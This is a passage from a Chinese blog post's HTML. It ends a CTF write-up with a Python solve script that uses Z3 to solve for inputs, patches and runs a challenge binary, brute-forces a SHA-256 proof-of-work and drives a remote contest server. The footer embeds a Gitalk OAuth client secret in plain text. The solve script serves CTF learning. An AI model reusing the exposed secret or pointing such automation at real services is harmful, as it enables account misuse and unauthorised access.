从比较数据计算输入flag</span><br>    a1 = BitVec(<span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">32</span>)<br>    a2 = BitVec(<span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">32</span>)<br>    a3 = BitVec(<span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">32</span>)<br>    a4 = BitVec(<span class="hljs-string">&quot;a4&quot;</span>, <span class="hljs-number">32</span>)<br><br>    v2 = <span class="hljs-number">7</span> * a2<br><br>    v3 = If(v2 != <span class="hljs-number">0</span>, (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xfffffffa</span>)<br>    v4 = a1 + <span class="hljs-number">6</span><br>    v5 = a4 + <span class="hljs-number">5</span><br>    v6 = a3 * <span class="hljs-number">4</span><br><br>    v1 = If(v6 != <span class="hljs-number">0</span>, (v6 &amp; <span class="hljs-number">0xffff</span>) - (v6 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xFFFFFFFD</span>)<br>    v7 = ((v3 ^ v5) &amp; <span class="hljs-number">0xffff</span>) * <span class="hljs-number">3</span><br><br>    hight_v7 = v7 &gt;&gt; <span class="hljs-number">16</span><br>    low_v7 = v7 &amp; <span class="hljs-number">0xffff</span><br>    tmp = low_v7 - hight_v7<br>    v8 = tmp<br>    v9_t = (v8 + (v1 ^ v4))<br>    v9 = v9_t &amp; <span class="hljs-number">0xffff</span><br>    v9_2 = v9 * <span class="hljs-number">2</span><br><br>    v10 = (v9_2 &amp; <span class="hljs-number">0xffff</span>) - (v9_2 &gt;&gt; <span class="hljs-number">16</span>)<br><br>    r1 = (((v3 ^ v10) &lt;&lt; <span class="hljs-number">16</span>) | (v10 ^ v5)) &amp; <span class="hljs-number">0xffffffff</span><br>    r2 = (((v4 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>)<br><br>    s = Solver()<br>    s.add(a1 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a2 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a3 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a4 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(<span class="hljs-number">0</span> &lt;= a1)<br>    s.add(<span class="hljs-number">0</span> &lt;= a2)<br>    s.add(<span class="hljs-number">0</span> &lt;= a3)<br>    s.add(<span class="hljs-number">0</span> &lt;= a4)<br>    s.add(r1 == targetR1)<br>    s.add(r2 == targetR2)<br>    <span class="hljs-keyword">assert</span> s.check() == sat<br>    res = s.model()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([de(res[a1].as_long()), de(res[a2].as_long()), de(res[a3].as_long()), de(res[a4].as_long())])<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256,sha3_256<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve</span>(<span class="hljs-params">code</span>):</span><br>    CODE_DATA = code<br>    <span class="hljs-comment"># 自动 patch</span><br>    insCode = [<span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x00</span>]<br>    CODE_DATA = <span class="hljs-built_in">bytearray</span>(CODE_DATA)<br>    CODE_DATA[<span class="hljs-number">0x132E</span>:<span class="hljs-number">0x132E</span>+<span class="hljs-built_in">len</span>(insCode)] = insCode<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;file_2&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(CODE_DATA)<br>    os.system(<span class="hljs-string">&quot;chmod 777 file_2&quot;</span>)<br>    p = process(<span class="hljs-string">&quot;./file_2&quot;</span>)<br>    data = p.recvall()<br>    r1, r2 = fuck(data)<br>    print(<span class="hljs-string">&quot;r1=&quot;</span>, <span class="hljs-built_in">hex</span>(r1))<br>    print(<span class="hljs-string">&quot;r2=&quot;</span>, <span class="hljs-built_in">hex</span>(r2))<br>    res = fuckyouZ3(r1, r2)<br>    <span class="hljs-keyword">return</span> binascii.a2b_hex(res)<br><br>sh = remote(<span class="hljs-string">&#x27;111.186.58.164&#x27;</span>,<span class="hljs-number">30212</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;XXXX+&#x27;</span>)<br>tail = sh.recvuntil(<span class="hljs-string">&#x27;)&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>print(tail)<br>sh.recvuntil(<span class="hljs-string">&#x27;== &#x27;</span>)<br>value = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>print(value)<br>xrange=string.digits+string.ascii_letters<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> xrange:<br>                m=(<span class="hljs-built_in">str</span>(i)+<span class="hljs-built_in">str</span>(j)+<span class="hljs-built_in">str</span>(x)+<span class="hljs-built_in">str</span>(l)+tail).encode()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sha256(m).hexdigest(),<span class="hljs-number">16</span>) == value:<br>                    payload1 = (<span class="hljs-built_in">str</span>(i)+<span class="hljs-built_in">str</span>(j)+<span class="hljs-built_in">str</span>(x)+<span class="hljs-built_in">str</span>(l))<br>                    print(payload1)<br><br>sh.recv()<br>sh.send(payload1)<br>sh.recvuntil(<span class="hljs-string">&#x27;Here is your challenge:\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>file = sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>file = base64.b64decode(file)<br>sh.send(solve(file))<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Here is your challenge:\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>file = sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>file = base64.b64decode(file)<br>sh.send(solve(file))<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Here is your challenge:\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>file = sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>file = base64.b64decode(file)<br>sh.send(solve(file))<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
                    
                      <a class="hover-with-bg" href="/tags/Unicorn/">Unicorn</a>
                    
                      <a class="hover-with-bg" href="/tags/AutoRE/">AutoRE</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/06/27/house-of-einherjar/">
                        <span class="hidden-mobile">house of einherjar</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
        var gitalk = new Gitalk({
          clientID: '2e60164d74c132464b61',
          clientSecret: '52a91b30d8b32af23cbb6d7c3ce8950d27240133',
          repo: 'P4nda0s.github.io',
          owner: 'P4nda0s',
          admin: ["P4nda0s"],
          id: '2be4f44bfeffc30bbaf72aa902d94376',
          language: 'zh-CN',
          labels: ["Gitalk"],
          perPage: 10,
          pagerDirection: 'last',
          createIssueManually: true,
          distractionFreeMode: true,
          proxy: 'https://purple-cell-2422.pandaos.workers.dev/?https://github.com/login/oauth/access_token'
        });
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
